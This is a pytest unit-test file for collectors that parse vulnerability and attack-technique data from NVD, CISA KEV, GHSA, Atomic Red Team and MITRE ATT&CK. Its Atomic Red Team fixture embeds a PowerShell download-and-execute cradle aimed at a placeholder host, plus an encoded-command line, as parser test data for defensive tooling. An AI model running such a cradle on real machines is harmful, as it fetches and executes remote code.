"""Unit tests for data collector modules (NVD, CISA KEV, GHSA, Atomic, MITRE)."""
import json
import os
import sys
import pytest
from unittest.mock import patch, MagicMock
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


# ── NVD Collector ─────────────────────────────────────────────────────────────

class TestNvdParseCve:
    """Tests for collectors.nvd_collector.parse_cve."""

    def test_parse_valid_cve(self):
        from collectors.nvd_collector import parse_cve
        vuln = {
            "cve": {
                "id": "CVE-2024-1234",
                "descriptions": [
                    {"lang": "en", "value": "A critical vulnerability allowing remote code execution in Example Server v1.2.3 via crafted HTTP requests."}
                ],
                "metrics": {
                    "cvssMetricV31": [{
                        "cvssData": {
                            "baseScore": 9.8,
                            "attackVector": "NETWORK",
                            "baseSeverity": "CRITICAL",
                        }
                    }]
                },
                "weaknesses": [{
                    "description": [{"value": "CWE-79"}, {"value": "CWE-89"}]
                }],
                "references": [
                    {"url": "https://example.com/advisory/1"},
                    {"url": "https://example.com/advisory/2"},
                ],
            }
        }
        result = parse_cve(vuln)
        assert result is not None
        assert result["cve_id"] == "CVE-2024-1234"
        assert result["cvss_score"] == 9.8
        assert result["severity"] == "CRITICAL"
        assert result["attack_vector"] == "NETWORK"
        assert "CWE-79" in result["cwes"]
        assert "CWE-89" in result["cwes"]
        assert len(result["references"]) == 2

    def test_parse_cve_short_description_returns_none(self):
        from collectors.nvd_collector import parse_cve
        vuln = {
            "cve": {
                "id": "CVE-2024-0001",
                "descriptions": [{"lang": "en", "value": "Short desc"}],
                "metrics": {},
                "weaknesses": [],
                "references": [],
            }
        }
        result = parse_cve(vuln)
        assert result is None

    def test_parse_cve_no_english_description_returns_none(self):
        from collectors.nvd_collector import parse_cve
        vuln = {
            "cve": {
                "id": "CVE-2024-0002",
                "descriptions": [{"lang": "fr", "value": "Une vulnérabilité critique" * 10}],
                "metrics": {},
                "weaknesses": [],
                "references": [],
            }
        }
        result = parse_cve(vuln)
        assert result is None

    def test_parse_cve_empty_cve_data(self):
        from collectors.nvd_collector import parse_cve
        result = parse_cve({})
        assert result is None

    def test_parse_cve_no_cwes(self):
        from collectors.nvd_collector import parse_cve
        vuln = {
            "cve": {
                "id": "CVE-2024-5678",
                "descriptions": [{"lang": "en", "value": "A vulnerability in Example allowing remote execution via specially crafted network packets."}],
                "metrics": {"cvssMetricV31": [{"cvssData": {"baseScore": 7.5, "attackVector": "NETWORK", "baseSeverity": "HIGH"}}]},
                "weaknesses": [],
                "references": [],
            }
        }
        result = parse_cve(vuln)
        assert result is not None
        assert result["cwes"] == []

    def test_parse_cve_references_capped_at_3(self):
        from collectors.nvd_collector import parse_cve
        vuln = {
            "cve": {
                "id": "CVE-2024-9999",
                "descriptions": [{"lang": "en", "value": "A vulnerability in Example Software that allows buffer overflow via network requests to the admin panel."}],
                "metrics": {"cvssMetricV31": [{"cvssData": {"baseScore": 8.0, "attackVector": "LOCAL", "baseSeverity": "HIGH"}}]},
                "weaknesses": [],
                "references": [{"url": f"https://ref{i}.example.com"} for i in range(10)],
            }
        }
        result = parse_cve(vuln)
        assert len(result["references"]) == 3


class TestNvdFetchPage:
    """Tests for collectors.nvd_collector.fetch_page with mocked HTTP."""

    @patch("collectors.nvd_collector.requests.get")
    def test_fetch_page_success(self, mock_get):
        from collectors.nvd_collector import fetch_page
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {"totalResults": 10, "vulnerabilities": []}
        mock_get.return_value = mock_resp

        result = fetch_page(0, "CRITICAL")
        assert result["totalResults"] == 10
        mock_get.assert_called_once()

    @patch("collectors.nvd_collector.requests.get")
    def test_fetch_page_retries_on_failure(self, mock_get):
        from collectors.nvd_collector import fetch_page
        mock_resp_fail = MagicMock()
        mock_resp_fail.status_code = 503
        mock_resp_ok = MagicMock()
        mock_resp_ok.status_code = 200
        mock_resp_ok.json.return_value = {"totalResults": 5, "vulnerabilities": []}
        mock_get.side_effect = [mock_resp_fail, mock_resp_ok]

        with patch("collectors.nvd_collector.time.sleep"):
            result = fetch_page(0, "HIGH")
        assert result["totalResults"] == 5

    @patch("collectors.nvd_collector.requests.get")
    def test_fetch_page_all_retries_fail_returns_empty(self, mock_get):
        from collectors.nvd_collector import fetch_page
        import requests as req
        mock_get.side_effect = req.RequestException("Connection timeout")

        with patch("collectors.nvd_collector.time.sleep"):
            result = fetch_page(0, "CRITICAL")
        assert result == {}


# ── CISA KEV Collector ────────────────────────────────────────────────────────

class TestCisaKevEnrich:
    """Tests for collectors.cisa_kev_collector.enrich_with_nvd."""

    @patch("collectors.cisa_kev_collector.requests.get")
    def test_enrich_success(self, mock_get):
        from collectors.cisa_kev_collector import enrich_with_nvd
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "vulnerabilities": [{
                "cve": {
                    "descriptions": [{"lang": "en", "value": "Example vuln description"}],
                    "metrics": {
                        "cvssMetricV31": [{
                            "cvssData": {
                                "baseScore": 9.1,
                                "attackVector": "NETWORK",
                                "privilegesRequired": "NONE",
                                "userInteraction": "NONE",
                            }
                        }]
                    },
                }
            }]
        }
        mock_get.return_value = mock_resp

        result = enrich_with_nvd("CVE-2024-1234")
        assert result["cvss_score"] == 9.1
        assert result["attack_vector"] == "NETWORK"
        assert result["nvd_description"] == "Example vuln description"

    @patch("collectors.cisa_kev_collector.requests.get")
    def test_enrich_http_error_returns_empty(self, mock_get):
        from collectors.cisa_kev_collector import enrich_with_nvd
        mock_resp = MagicMock()
        mock_resp.status_code = 404
        mock_get.return_value = mock_resp

        result = enrich_with_nvd("CVE-INVALID")
        assert result == {}

    @patch("collectors.cisa_kev_collector.requests.get")
    def test_enrich_exception_returns_empty(self, mock_get):
        from collectors.cisa_kev_collector import enrich_with_nvd
        mock_get.side_effect = Exception("Network error")

        result = enrich_with_nvd("CVE-2024-0000")
        assert result == {}

    @patch("collectors.cisa_kev_collector.requests.get")
    def test_enrich_empty_vulns_returns_empty(self, mock_get):
        from collectors.cisa_kev_collector import enrich_with_nvd
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {"vulnerabilities": []}
        mock_get.return_value = mock_resp

        result = enrich_with_nvd("CVE-2024-0000")
        assert result == {}


class TestCisaKevCollect:
    """Tests for collectors.cisa_kev_collector.collect with mocked HTTP."""

    @patch("collectors.cisa_kev_collector.requests.get")
    def test_collect_no_enrich(self, mock_get, tmp_path):
        from collectors import cisa_kev_collector
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "vulnerabilities": [
                {
                    "cveID": "CVE-2024-1234",
                    "vendorProject": "TestVendor",
                    "product": "TestProduct",
                    "vulnerabilityName": "Test Vuln",
                    "shortDescription": "A test vulnerability",
                    "requiredAction": "Apply patch",
                    "dateAdded": "2024-01-01",
                    "dueDate": "2024-02-01",
                    "knownRansomwareCampaignUse": "Known",
                    "notes": "",
                },
            ]
        }
        mock_resp.raise_for_status = MagicMock()
        mock_get.return_value = mock_resp

        output = tmp_path / "raw_kev.json"
        with patch.object(cisa_kev_collector, "OUTPUT_FILE", output):
            results = cisa_kev_collector.collect(enrich=False)
        assert len(results) == 1
        assert results[0]["cve_id"] == "CVE-2024-1234"
        assert results[0]["vendor"] == "TestVendor"
        assert output.exists()


# ── GHSA Collector ────────────────────────────────────────────────────────────

class TestGhsaParseAdvisory:
    """Tests for collectors.ghsa_collector.parse_advisory."""

    def test_parse_valid_advisory(self):
        from collectors.ghsa_collector import parse_advisory
        adv = {
            "ghsa_id": "GHSA-xxxx-xxxx-xxxx",
            "summary": "Critical RCE in example-package",
            "description": "An RCE vulnerability exists in the deserialization component." * 5,
            "severity": "critical",
            "cvss": {"score": 9.8},
            "cwes": [{"cwe_id": "CWE-502"}],
            "vulnerabilities": [{
                "package": {"name": "example-package", "ecosystem": "npm"},
            }],
            "identifiers": [{"type": "CVE", "value": "CVE-2024-5678"}],
            "published_at": "2024-06-01",
            "references": ["https://example.com/advisory"],
        }
        result = parse_advisory(adv)
        assert result is not None
        assert result["ghsa_id"] == "GHSA-xxxx-xxxx-xxxx"
        assert result["cve_id"] == "CVE-2024-5678"
        assert result["severity"] == "critical"
        assert result["cvss_score"] == 9.8
        assert "CWE-502" in result["cwes"]
        assert len(result["packages"]) == 1

    def test_parse_advisory_missing_summary_returns_none(self):
        from collectors.ghsa_collector import parse_advisory
        result = parse_advisory({"description": "desc", "summary": ""})
        assert result is None

    def test_parse_advisory_missing_description_returns_none(self):
        from collectors.ghsa_collector import parse_advisory
        result = parse_advisory({"summary": "sum", "description": ""})
        assert result is None

    def test_parse_advisory_no_cve_identifier(self):
        from collectors.ghsa_collector import parse_advisory
        adv = {
            "ghsa_id": "GHSA-yyyy-yyyy-yyyy",
            "summary": "Some advisory",
            "description": "Detailed description of the issue " * 5,
            "severity": "high",
            "cvss": None,
            "cwes": [],
            "vulnerabilities": [{"package": {"name": "test-pkg", "ecosystem": "npm"}}],
            "identifiers": [{"type": "GHSA", "value": "GHSA-yyyy-yyyy-yyyy"}],
            "published_at": "2024-01-01",
            "references": [],
        }
        result = parse_advisory(adv)
        assert result is not None
        assert result["cve_id"] == ""
        assert result["cvss_score"] == 0


class TestGhsaFetchAdvisories:
    """Tests for collectors.ghsa_collector.fetch_advisories."""

    @patch("collectors.ghsa_collector.requests.get")
    def test_fetch_success(self, mock_get):
        from collectors.ghsa_collector import fetch_advisories
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = [{"ghsa_id": "GHSA-test"}]
        mock_get.return_value = mock_resp

        result = fetch_advisories("npm", "critical")
        assert len(result) == 1

    @patch("collectors.ghsa_collector.requests.get")
    def test_fetch_rate_limited_returns_empty(self, mock_get):
        from collectors.ghsa_collector import fetch_advisories
        mock_resp = MagicMock()
        mock_resp.status_code = 403
        mock_get.return_value = mock_resp

        result = fetch_advisories("npm", "critical")
        assert result == []

    @patch("collectors.ghsa_collector.requests.get")
    def test_fetch_exception_returns_empty(self, mock_get):
        from collectors.ghsa_collector import fetch_advisories
        mock_get.side_effect = Exception("Network error")

        result = fetch_advisories("npm", "high")
        assert result == []


# ── Atomic Red Team Collector ─────────────────────────────────────────────────

class TestAtomicParseTests:
    """Tests for collectors.atomic_collector.parse_atomic_tests."""

    def test_parse_basic_atomic_yaml(self):
        from collectors.atomic_collector import parse_atomic_tests
        raw = {
            "technique_id": "T1059.001",
            "url": "https://example.com",
            "raw_yaml": """attack_technique: T1059.001
display_name: PowerShell
atomic_tests:
- name: Invoke-Expression download cradle
  description: |
    Downloads and executes a script from the internet using PowerShell
  supported_platforms: [windows]
  executor:
    command: |
      IEX (New-Object Net.WebClient).DownloadString('https://example.com')
    name: powershell

- name: Encoded command execution
  description: |
    Runs a base64-encoded PowerShell command
  supported_platforms: [windows]
  executor:
    command: |
      powershell -enc dGVzdA==
    name: powershell
""",
        }
        tests = parse_atomic_tests(raw)
        assert len(tests) == 2
        assert tests[0]["technique_id"] == "T1059.001"
        assert tests[0]["technique_name"] == "PowerShell"
        assert "Invoke-Expression" in tests[0]["test_name"]
        assert tests[1]["test_name"] == "Encoded command execution"

    def test_parse_empty_yaml(self):
        from collectors.atomic_collector import parse_atomic_tests
        raw = {"technique_id": "T1000", "raw_yaml": ""}
        tests = parse_atomic_tests(raw)
        assert tests == []

    def test_parse_yaml_no_test_blocks(self):
        from collectors.atomic_collector import parse_atomic_tests
        raw = {
            "technique_id": "T1000",
            "raw_yaml": "attack_technique: T1000\ndisplay_name: SomeTechnique\n",
        }
        tests = parse_atomic_tests(raw)
        assert tests == []


class TestAtomicFetchYaml:
    """Tests for collectors.atomic_collector.fetch_atomic_yaml."""

    @patch("collectors.atomic_collector.requests.get")
    def test_fetch_success(self, mock_get):
        from collectors.atomic_collector import fetch_atomic_yaml
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.text = "attack_technique: T1059.001\ndisplay_name: PowerShell"
        mock_get.return_value = mock_resp

        result = fetch_atomic_yaml("T1059.001")
        assert result is not None
        assert result["technique_id"] == "T1059.001"
        assert "PowerShell" in result["raw_yaml"]

    @patch("collectors.atomic_collector.requests.get")
    def test_fetch_404_returns_none(self, mock_get):
        from collectors.atomic_collector import fetch_atomic_yaml
        mock_resp = MagicMock()
        mock_resp.status_code = 404
        mock_get.return_value = mock_resp

        result = fetch_atomic_yaml("T9999")
        assert result is None

    @patch("collectors.atomic_collector.requests.get")
    def test_fetch_exception_returns_none(self, mock_get):
        from collectors.atomic_collector import fetch_atomic_yaml
        mock_get.side_effect = Exception("timeout")

        result = fetch_atomic_yaml("T1059.001")
        assert result is None


# ── MITRE Collector ───────────────────────────────────────────────────────────

class TestMitreCollector:
    """Tests for collectors.mitre_collector.fetch_via_github with mocked HTTP."""

    @patch("collectors.mitre_collector.requests.get")
    def test_fetch_via_github_success(self, mock_get):
        from collectors.mitre_collector import fetch_via_github
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "objects": [
                {
                    "type": "attack-pattern",
                    "id": "attack-pattern--test-1",
                    "name": "Test Technique",
                    "description": "A test technique for unit testing purposes.",
                    "kill_chain_phases": [{"phase_name": "execution"}],
                    "x_mitre_platforms": ["Windows"],
                    "x_mitre_detection": "Monitor for test events",
                    "external_references": [
                        {"source_name": "mitre-attack", "external_id": "T9999"}
                    ],
                },
                {
                    "type": "attack-pattern",
                    "id": "attack-pattern--revoked",
                    "name": "Revoked Technique",
                    "description": "Should be filtered out.",
                    "revoked": True,
                },
                {
                    "type": "malware",
                    "id": "malware--test",
                    "name": "Not a technique",
                },
            ]
        }
        mock_resp.raise_for_status = MagicMock()
        mock_get.return_value = mock_resp

        result = fetch_via_github()
        assert len(result["techniques"]) == 1
        assert result["techniques"][0]["name"] == "Test Technique"
        assert result["techniques"][0]["mitre_id"] == "T9999"
        assert result["techniques"][0]["platforms"] == ["Windows"]
